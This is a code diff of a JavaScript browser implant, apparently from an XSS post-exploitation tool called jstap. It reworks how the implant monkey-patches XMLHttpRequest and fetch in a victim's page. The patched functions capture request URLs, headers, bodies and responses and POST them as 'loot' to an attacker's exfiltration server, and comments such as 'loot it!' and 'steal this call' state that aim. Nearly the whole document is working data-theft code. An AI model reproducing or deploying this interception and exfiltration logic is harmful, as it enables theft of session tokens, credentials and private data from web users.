@@ -68,7 +68,7 @@ function initGlobals()
 	// Create our own XHR that won't get modified by monkeyPatching
 	window.taperXHR = XMLHttpRequest;
 
-
+	window.originalFetch = window.fetch;
 
 
 	// Helpful variables
@@ -672,57 +672,63 @@ function getFetchReference()
 // Check if the intercepted API call
 // is our own API calls back to return loot.
 // We shouldn't intercept our own XHR/Fetch calls. 
-function isInterceptableHost(url)
-{
-	console.log("** top of isInterceptableHost...");
-	try
-	{
-		urlHandler = new URL(url);
-		server = urlHandler.hostname;
-		port   = urlHandler.port;
+// function isInterceptableHost(url)
+// {
+// 	console.log("** top of isInterceptableHost...");
+// 	try
+// 	{
+// 		urlHandler = new URL(url);
+// 		server = urlHandler.hostname;
+// 		port   = urlHandler.port;
 
-		destinationServer = "https://" + server + ":" + port;
+// 		destinationServer = "https://" + server + ":" + port;
 
-		console.log("URL Handler: " + destinationServer);
+// 		console.log("URL Handler: " + destinationServer);
 
-		// We need to make sure we're not intercepting our own
-		// exfiltration calls, we're also using XHR
-		if (destinationServer != taperexfilServer)
-		{
-			console.log("Not our own api call, loot it!");
-			return true;
-		}
-		else
-		{
-			// It's our own API call, skip it
-			console.log("Skip this, it's our own API call");
-			return false;
-		}
-	}
-	catch (error)
-	{
-		// If URL failed, it's likely a local path,
-		// not a call to our own jstap server. Intercept it. 
-		console.log("XXXXXXXXX Partial path! Not our own api call, loot it: " + error);
-		console.log("---- url: " + url);
-		return true;
-	}
-}
+// 		// We need to make sure we're not intercepting our own
+// 		// exfiltration calls, we're also using XHR
+// 		if (destinationServer != taperexfilServer)
+// 		{
+// 			console.log("Not our own api call, loot it!");
+// 			return true;
+// 		}
+// 		else
+// 		{
+// 			// It's our own API call, skip it
+// 			console.log("Skip this, it's our own API call");
+// 			return false;
+// 		}
+// 	}
+// 	catch (error)
+// 	{
+// 		// If URL failed, it's likely a local path,
+// 		// not a call to our own jstap server. Intercept it. 
+// 		console.log("XXXXXXXXX Partial path! Not our own api call, loot it: " + error);
+// 		console.log("---- url: " + url);
+// 		return true;
+// 	}
+// }
 
 
 
 // Fetch API wrapper for monkey patching
 function customFetch(url, options)
 {
+
+	if (this.noIntercept)
+	{
+		console.log("$$$$$ Skipping fetch intercept");
+		return;
+	}
 	console.log("** Cloned Fetch API call**");
-	// console.log("Fetch url: " + url);
-	// console.log("Fetch method: " + options.method);
-	// console.log("Fetch headers: " + JSON.stringify(options.headers));
-	// console.log("Fetch body: " + options.body);
+	console.log("Fetch url: " + url);
+	console.log("Fetch method: " + options.method);
+	console.log("Fetch headers: " + JSON.stringify(options.headers));
+	console.log("Fetch body: " + options.body);
+	console.log("----------");
 
 	// send setup loot
-	// request = new XMLHttpRequest();
-	request = new window.taperXHR();
+	request = new XMLHttpRequest();
 	request.noIntercept = true;
 	request.open("POST", taperexfilServer + "/loot/fetchSetup/" + 
 		sessionStorage.getItem('taperSessionUUID'));
@@ -737,11 +743,10 @@ function customFetch(url, options)
 	for (const key in options.headers)
 	{
 		const value = options.headers[key];
-		// console.log("**** " + key, value);
+		console.log("**** " + key, value);
 
 		// send header loot
-		// request = new XMLHttpRequest();
-		request = new window.taperXHR();
+		request = new XMLHttpRequest();
 		request.noIntercept = true;
 		request.open("POST", taperexfilServer + "/loot/fetchHeader/" + 
 			sessionStorage.getItem('taperSessionUUID'));
@@ -757,19 +762,22 @@ function customFetch(url, options)
 	// Let's get the API call good stuff
 	const requestBody = options.body;
 
+	console.log("### About to clone request...");
 
 	// Clone request
-	return fetch(url, options).then((response) => {
+	// return fetch(url, options).then((response) => {
+	return originalFetch(url, options).then((response) => {
 		// clone response
 		return response.clone().text().then((body) => {
-			// console.log('Response Status:', response.status);
-			// console.log('Response Headers:', response.headers);
-			// console.log('Response Body:', body);
+			console.log('Response Status:', response.status);
+			console.log('Response Headers:', response.headers);
+			console.log('Response Body:', body);
 
+			// Flag this one as now intercept
+			this.noIntercept = true;
 
 			// send API call body loot
-			// request = new XMLHttpRequest();
-			request = new window.taperXHR();
+			request = new XMLHttpRequest();
 			request.noIntercept = true;
 			request.open("POST", taperexfilServer + "/loot/fetchCall/" + 
 				sessionStorage.getItem('taperSessionUUID'));
@@ -819,17 +827,12 @@ function monkeyPatch()
 	//Monkey patch open
 	getXhrReference().prototype.open = async function(method, url, async, user, password) 
 	{
-		console.log("-----------------------------------------------");
 		var method = arguments[0];
 		var url = arguments[1];
 
-		// console.log("Intercepted XHR open: " + method + ", " + url);
-
 		if (!this.noIntercept)
 		{
-			// console.log("We need to steal this call!");
-			// send loot
-			// request = new XMLHttpRequest();
+			// Save for later
 			this._url = url;
 			this._method = method;
 		}
@@ -842,32 +845,22 @@ function monkeyPatch()
 	// Monkey patch setRequestHeader
 	getXhrReference().prototype.setRequestHeader =  async function (header, value)
 	{
-		console.log("-----------------------------------------------");
 		var header = arguments[0];
 		var value  = arguments[1];
 
 		if (!this.noIntercept)
 		{
-			// console.log("$$$ MonekeyURL: " + this.url);
-
-			// console.log("Intercepted Header = " + header + ": " + value);
-
-
 			// Check if we already have the dictionary
 			if(!this.hasOwnProperty("_requestHeaders"))
 			{
-				// console.log("The XHR object doesn't have the dictionary yet!");
+				// Create the dictionary property
 				this._requestHeaders = {};
 			}
 
+			// Save the header for later use
 			this._requestHeaders[header] = value;
 		}
-		// else
-		// {
-		// 	console.log("$$$ Not intercepting this setHeader: " + header + ": " + value);
-		// }
 
-		// console.log("About to apply original setHeader...");
 	 	xhrOriginalSetHeader.apply(this, arguments);
 	}
 
@@ -877,7 +870,6 @@ function monkeyPatch()
 	{
 		if (!this.noIntercept)
 		{
-
 			console.log("-----------------------------------------------");
 			console.log("Intercepted request body: " + data);
 
@@ -912,7 +904,6 @@ function monkeyPatch()
 
 				// Send off the header events
 				request = new XMLHttpRequest();
-				// request = new window.taperXHR();
 				request.noIntercept = true;
 				request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + 
 					sessionStorage.getItem('taperSessionUUID'));
@@ -956,7 +947,6 @@ function monkeyPatch()
 
 
 					request = new XMLHttpRequest();
-					// request = new window.taperXHR();
 					request.noIntercept = true;
 					request.open("POST", taperexfilServer + "/loot/xhrCall/" + 
 						sessionStorage.getItem('taperSessionUUID'));
@@ -976,10 +966,6 @@ function monkeyPatch()
 				}
 			}
 		}
-		else
-		{
-			console.log("** Skipping intercept");
-		}
 
 		xhrOriginalSend.apply(this, arguments);
 	}
@@ -990,7 +976,7 @@ function monkeyPatch()
 	// Now for the Fetch API
 	console.log("## Starting fetch monkey patching");
 	// Fetch API monkey patching
-	const originalFetch = window.fetch;
+	// const originalFetch = window.fetch;
 	getFetchReference().fetch = customFetch;
 }
 
